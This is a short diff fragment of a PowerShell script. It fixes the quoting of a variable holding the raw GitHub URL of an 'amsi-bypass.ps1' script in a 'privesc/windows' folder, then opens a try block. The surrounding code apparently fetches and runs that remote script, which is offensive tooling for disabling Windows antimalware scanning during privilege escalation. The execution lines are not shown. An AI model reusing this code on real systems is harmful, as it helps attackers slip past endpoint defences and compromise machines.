@@ -1,4 +1,5 @@
-$scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1
+
+$scriptUrl = "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1"
 
 $scriptBlock = {
     try {
